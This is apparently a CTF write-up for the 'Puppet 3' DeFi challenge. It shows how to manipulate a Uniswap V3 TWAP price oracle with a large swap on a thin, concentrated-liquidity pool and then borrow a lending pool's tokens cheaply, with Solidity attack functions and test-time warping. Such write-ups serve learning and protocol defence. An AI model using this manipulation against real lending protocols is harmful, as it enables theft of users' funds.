# Solving the Puppet 3 – My Journey

## My Thoughts

_Simple, yet complex._

If you're tackling this challenge, definitely get comfortable with Uniswap V3 first. Unlike V2's simple curve, V3 has concentrated liquidity which changes everything about price impact. I spent time understanding the protocol beforehand and it paid off - once I got the concepts, solving this took minutes.

## The Challenge Breakdown

### Classic Oracle Manipulation

The lending protocol uses Uniswap V3's `TWAP` oracle for pricing. Manipulate the pool price, wait for TWAP to catch up, then borrow cheap. Simple concept.

### Concentrated Liquidity = Big Price Impact

Here's the key insight: The challenge gives us tiny liquidity `(100 DVT + 100 WETH)` concentrated in ticks `-60 to +60`. This creates a shallow order book where any decent-sized trade causes massive price swings.

In V2, liquidity spreads across the entire curve. In V3, cramming it into a narrow range means way higher capital efficiency but also way higher price impact - exactly what we need.

### The Economics

- Normal cost: ~3M WETH to borrow 1M DVT
- After manipulation: Fraction of that `(~0.14 ether)` due to crashed DVT price
- Available in the pool: Only 100 DVT + 100 WETH

### The TWAP Problem

Protocol uses `10-minute TWAP`, but we need results fast. The trick:

- Crash the price with a big swap
  ```js
  i_pool.swap({
    recipient: address(this),
    zeroForOne: true,
    amountSpecified: int256(dvtBalance),
    sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,
    data: bytes(""),
  });
  ```
- Use vm.warp() to fast-forward time in tests

  ```js
  vm.warp(block.timestamp + 114);
  ```

- TWAP now reflects our manipulated price
  ```js
  uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  console.log("wethNeeded: ", wethNeeded); //0.14 ether
  ```
- Borrow at the cheap rate
  ```js
  function borrowAttack() external {
        i_weth.approve(address(i_lendingPool), type(uint256).max);
        i_lendingPool.borrow(i_amountToBorrow);
        transferTokensToRecovery();
    }
  ```

### The Attack flow

```js
//1.Swap all the DVT tokens the user owns, adding more DVT and taking WETH out and hence reducing the price
function swapAttack() external {
        uint256 dvtBalance = i_dvt.balanceOf(address(this));
        i_weth.deposit{value: address(this).balance}();
        console.log("dvtBalance: ", dvtBalance);
        //approve the pool to take the funds out
        i_dvt.approve(address(i_pool), type(uint256).max);

        i_pool.swap({
            recipient: address(this),
            zeroForOne: true,
            amountSpecified: int256(dvtBalance),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,
            data: bytes("")
        });
    }
```

```js
//2. let the change reflect with some time
vm.warp(block.timestamp + 114);
```

```js
//3. Borrow at a cheaper rate and transfer all the tokens to recovery address
function borrowAttack() external {
        i_weth.approve(address(i_lendingPool), type(uint256).max);
        i_lendingPool.borrow(i_amountToBorrow);
        transferTokensToRecovery();
    }

    function transferTokensToRecovery() private {
        i_dvt.transfer(i_recovery,i_amountToBorrow );
    }
```

### Key takeaways

This challenge shows how V3's capital efficiency creates new attack vectors. The same concentrated liquidity that makes V3 awesome for LPs makes it risky for protocols using it as a price oracle without considering liquidity depth.
